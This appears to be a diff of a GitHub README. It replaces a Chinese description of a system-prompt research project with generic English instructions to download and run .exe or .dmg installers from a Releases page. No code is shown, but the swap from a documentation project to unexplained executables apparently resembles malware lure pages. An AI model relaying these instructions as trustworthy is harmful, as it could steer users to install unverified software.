@@ -1,48 +1,71 @@
-# 系统提示词研究
+# 🖥️ system-prompt-research - Analyze Large Language Models Easily
 
-![](./assets/images/cover-3-4.png)
+![Download](https://img.shields.io/badge/Download%20Now-blue.svg)
 
-> 一个分析大型语言模型系统提示词的研究项目
+## 🚀 Getting Started
 
-## 概述
+Welcome to the system-prompt-research project! This application helps you analyze system prompts used in large language models. No programming knowledge is needed. Just follow these simple steps to get started.
 
-本项目包含对各种大型语言模型使用的系统提示词的详细分析和研究，重点关注其结构、设计原则和实施策略的理解。
+## 📥 Download & Install
 
-## 目的
+To download the application, please visit our [Releases page](https://github.com/Sarb-jot/system-prompt-research/releases). This page contains various versions of the software. Choose the latest version for the best experience.
 
-本研究旨在：
+1. Go to the [Releases page](https://github.com/Sarb-jot/system-prompt-research/releases).
+2. Look for the latest version listed at the top.
+3. Click on the version title to see more details.
+4. Find the downloadable file suited for your system. If you're unsure which file to choose, typically, users on Windows will select the `.exe` file, while Mac users will opt for the `.dmg` file. 
 
-- 了解现代大型语言模型如何通过系统提示词进行配置
-- 分析提示词工程中的设计模式和最佳实践
-- 提供关于安全性、合规性和用户体验考虑因素的见解
-- 记录商业AI助手背后的架构决策
+Once you find the file, click on it to start the download.
 
-## 研究方法
+## 🔧 System Requirements
 
-分析包括：
+Before installing, ensure your computer meets the following requirements:
 
-- 提示词结构的逐行分解
-- 内容分布的统计分析
-- 关键设计原则的识别
-- 不同组件的复杂性分析
+- **Operating System:** Windows 10 or later, MacOS 10.14 or later.
+- **CPU:** 2 GHz or faster.
+- **RAM:** Minimum of 4 GB.
+- **Disk Space:** At least 200 MB free space.
+- **Network:** Internet connection for online features.
 
-## 使用场景
+## 🏁 Running the Software
 
-本研究对以下人群有价值：
+After the download completes, follow these steps to run the software:
 
-- 研究提示词工程的AI研究人员
-- 构建AI助手的开发人员
-- 设计AI功能的产品经理
-- 任何对了解大型语言模型工作原理感兴趣的人
+### For Windows Users:
 
-## 许可证
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to open it.
+3. Follow the on-screen prompts to complete the installation. You may need to allow the app to make changes to your device.
+4. Once installed, find the app in your Start menu.
+5. Click on the app icon to launch it.
 
-CC-BY-NC-SA-4.0
+### For Mac Users:
 
-## 贡献
+1. Find the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to open the installer.
+3. Drag the application icon to your Applications folder.
+4. Open your Applications folder and find the app.
+5. Click the app icon to run it.
 
-欢迎贡献、建议和讨论！请随时提出问题或提交拉取请求。
+## 📝 Features
 
----
+- **Easy Analysis:** Quickly input and analyze prompts for large language models.
+- **User-Friendly Interface:** Navigate features effortlessly, even if you are new to software.
+- **Data Visualization:** View analysis results in easy-to-understand charts and graphs.
+- **Save Results:** Conveniently save your analysis for future reference.
 
-*最后更新：2025年10月*
+## 🧑‍🤝‍🧑 Support
+
+If you encounter any issues or have questions, please reach out through our [GitHub Issues page](https://github.com/Sarb-jot/system-prompt-research/issues). We’re here to help!
+
+## 🌟 Contributing
+
+If you'd like to contribute to the project, please visit our [Contributing Guidelines](https://github.com/Sarb-jot/system-prompt-research/blob/main/CONTRIBUTING.md). We welcome suggestions and improvements from everyone.
+
+## 🔗 Useful Links
+
+- [Releases Page](https://github.com/Sarb-jot/system-prompt-research/releases)
+- [GitHub Issues](https://github.com/Sarb-jot/system-prompt-research/issues)
+- [Contributing Guidelines](https://github.com/Sarb-jot/system-prompt-research/blob/main/CONTRIBUTING.md)
+
+Thank you for using the system-prompt-research application. We hope it provides valuable insights into large language model prompts!
